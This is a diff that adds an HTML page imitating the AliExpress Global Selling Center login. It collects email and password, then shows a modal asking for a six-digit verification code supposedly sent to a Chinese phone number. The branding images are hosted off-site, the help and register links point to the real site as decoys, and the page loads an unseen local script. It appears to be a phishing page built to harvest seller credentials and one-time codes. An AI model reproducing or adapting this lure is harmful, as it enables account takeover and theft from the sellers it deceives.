@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
+    integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg=="
+    crossorigin="anonymous"
+    referrerpolicy="no-referrer"
+  />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+    rel="stylesheet"
+  />
+    <title>Buy Products Online from China Wholesalers</title>
+    <link rel="icon" href="https://ae01.alicdn.com/kf/S319fd8b965e247a28c70363f8c91d7c9i.ico">
+    <style>
+        /* Hide number input spinners for Chrome, Safari, Edge, and Opera */
+        input[type="number"]::-webkit-inner-spin-button,
+        input[type="number"]::-webkit-outer-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        /* Hide spinners for Firefox */
+        input[type="number"] {
+            -moz-appearance: textfield;
+        }
+    </style>
+</head>
+<body>
+    <main>
+    <aside class="loginsection">
+                   <!-- Custom Dropdown -->
+                   <div class="head" id="languageDropdown">
+                    <i class="fa-solid fa-globe" style="font-size: 14px;"></i>
+                    <p id="selectedLanguage" style="font-size: 14px;">English</p>
+                    <img src="https://ik.imagekit.io/3tz03jgwm/down-arrow.png" height="18px"/>
+                    <div id="languageOptions" class="togglehidden">
+                        <div data-lang="en">English</div>
+                        <div data-lang="zh">中文</div>
+                        <div data-lang="de">Deutsch</div>
+                        <div data-lang="pl">Polski</div>
+                        <div data-lang="ja">日本語</div>
+                        <div data-lang="ru">Русский</div>
+                        <div data-lang="es">Español</div>
+                        <div data-lang="it">Italiano</div>
+                        <div data-lang="tr">Türkçe</div>
+                        <div data-lang="fr">Français</div>
+                        <div data-lang="pt">Português</div>
+                    </div>
+                </div>
+    
+        <div class="mainloginbg">
+        <div class="mainlogin">
+            <div class="logo">
+                <img src="https://ik.imagekit.io/3tz03jgwm/assets/Aliexpressnewlogo.png" alt="AliExpress Logo"/>
+            </div>
+            <div class="logintxt">
+                <h2 data-translate="Welcome to">Welcome to</h2>
+                <h2 data-translate="Global Selling Center">Global Selling Center</h2>
+                <p data-translate="Enter your details below">Enter your details below</p>
+            </div>
+            <div class="loginform">
+                <div class="fields">
+                    <input type="email" id="email" placeholder="Email" data-translate="Email" required>
+                    <img src="https://ik.imagekit.io/3tz03jgwm/assets/cancel.svg" alt="Clear" id="clearEmail" class="clear-icon hidden" height="20px">
+                </div>
+                <div class="fields">
+                    <input type="password" id="password" placeholder="Password" data-translate="Password" required>
+                    <span style="display: flex; align-items: center; gap: 2px;">
+                        <img src="https://ik.imagekit.io/3tz03jgwm/cancel.svg" alt="Clear" id="clearPassword" class="clear-icon hidden" height="20px"> 
+                        <img src="https://ik.imagekit.io/3tz03jgwm/eye.png" alt="Toggle Password" id="togglePasswordHidden" class="icon hidden" height="20px">
+                        <img src="https://ik.imagekit.io/3tz03jgwm/eye-hide.png" alt="Toggle Password" id="togglePassword"  height="20px">
+                        </span>
+                </div>
+                <div class="forgotpassword">
+                    <a href="https://www.aliexpress.com/" data-translate="Forgot Password">Forgot Password</a>
+                </div>
+                <div class="loginbtns">
+                    <button id="btnli" class="disabled" data-translate="Sign In">Sign In <i class="fa-solid fa-arrow-right" style="color: white;"></i></button>
+                    <button style="cursor: pointer; text-decoration: none;"><a  style="text-decoration: none; color: #333;" href="https://www.aliexpress.com/" data-translate="Register">Register</a></button>
+                </div>
+            </div>
+
+        </div>
+    </div>
+    </aside>
+    <div class="carousel">
+        <div class="glassy-content">
+            <h2 data-translate="A Trusted Platform">A Trusted Platform</h2>
+            <p data-translate="A Professional Operations Team to Boost Your Sales Performance!">A Professional Operations Team to Boost Your Sales Performance!</p>
+        </div>
+      </div>
+</main>
+<div id="otpModal" class="modal hidden">
+    <div class="modal-content">
+        <h2 style="font-size: 23px;">verification code</h2>
+        <p style="color:#999; font-size: 14px; font-weight: 400; margin: 18px 0;">Enter the 6-digit code sent to +86.***********<br><span id="inputPlaceholder"></span></p>
+        <div class="otp-inputs">
+            <input type="number" maxlength="1" class="otp-field" />
+            <input type="number" maxlength="1" class="otp-field" />
+            <input type="number" maxlength="1" class="otp-field" />
+            <input type="number" maxlength="1" class="otp-field" />
+            <input type="number" maxlength="1" class="otp-field" />
+            <input type="number" maxlength="1" class="otp-field" />
+        </div>
+        <p id="countdownDisplay" style="color: #aaaaaa; font-size: 14px;"></p>
+        <div id="warningMessage" class="warning hidden">⚠️ Something went wrong. Try again.</div>
+        <button id="verifyButton" class="otpdisabled">Verify</button>
+        <a href="#" style="text-decoration: underline; color: #1f64fa; font-size: 14px; text-align: center; display: flex; justify-content: center; align-items: center; font-weight: 600;">Other ways to verify</a>
+        <p style="color: #aaaaaa; font-size: 12px; text-align: center; display: flex; justify-content: center; align-items: center; margin: 20px 0;">OTPs are usually delivered within 3 to 5 minutes.</p>
+    </div>
+</div>
+
+
+  <script src="./script.js"></script>
+</body>
+</html>
